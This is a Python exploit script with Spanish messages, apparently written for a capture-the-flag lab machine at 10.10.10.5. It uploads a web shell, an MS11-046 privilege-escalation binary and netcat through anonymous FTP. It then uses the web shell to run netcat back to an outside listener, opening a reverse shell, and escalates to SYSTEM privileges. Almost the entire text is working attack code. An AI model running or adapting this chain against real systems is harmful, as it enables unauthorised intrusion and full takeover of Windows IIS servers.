import requests
import signal
import re
import time
import threading
import sys
import pdb
 
from pwn import *
from ftplib import FTP
 
# Variables globales
malicious_files = [ "cmd.aspx", "ms11-046.exe", "nc.exe" ]
main_url = "http://10.10.10.5/%s" % malicious_files[0]
lport = 443
 
def def_handler(sig, frame):
    print "\n[!] Saliendo...\n"
    sys.exit(1)
 
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)
 
def exploit():
    try:
        ftp = FTP()
    #    ftp.set_debuglevel(2)
        ftp.connect("10.10.10.5", 21)
        ftp.login("anonymous", "")
 
        p1 = log.progress("Subida de archivos")
        p1.status("Subiendo archivos")
        time.sleep(2)
 
        for malicious_file in malicious_files:
 
            fp = open(malicious_file, 'rb')
            ftp.storbinary("STOR %s" % malicious_file, fp, 1024)
            fp.close()
 
        p1.success("Archivos subidos exitosamente")
        time.sleep(1)
 
        s = requests.session()
 
        response = s.get(main_url)
 
        ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"', response.text)[0]
        EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', response.text)[0]
 
        data_post = {
            '__VIEWSTATE': ViewState,
            '__EVENTVALIDATION': EventValidation,
            'txtArg': 'C:\inetpub\wwwroot\%s -e cmd 10.10.16.160 443' % malicious_files[2],
            'testing': 'excute'
        }
 
        s.post(main_url, data=data_post)
 
    except:
        print "\n[!] Saliendo...\n"
        sys.exit(1)
 
if __name__ == '__main__':
 
    try:
        threading.Thread(target=exploit, args=()).start()
    except Exception as e:
        log.error(str(e))
 
    p2 = log.progress("Acceso al sistema")
    p2.status("Esperando la Shell")
 
    shell = listen(lport, timeout=20).wait_for_connection()
 
    if shell.sock is None:
        p2.failure("Acceso no garantizado")
        sys.exit(1)
    else:
        p2.success("Acceso garantizado")
 
    time.sleep(2)
 
    p3 = log.progress("Privesc")
    p3.status("Escalando privilegios")
    time.sleep(2)
 
    shell.sendline("C:\inetpub\wwwroot\%s" % malicious_files[1])
    shell.sendline("whoami")
 
    p3.success("Escalada de privilegios realizada exitosamente")
 
    shell.interactive()
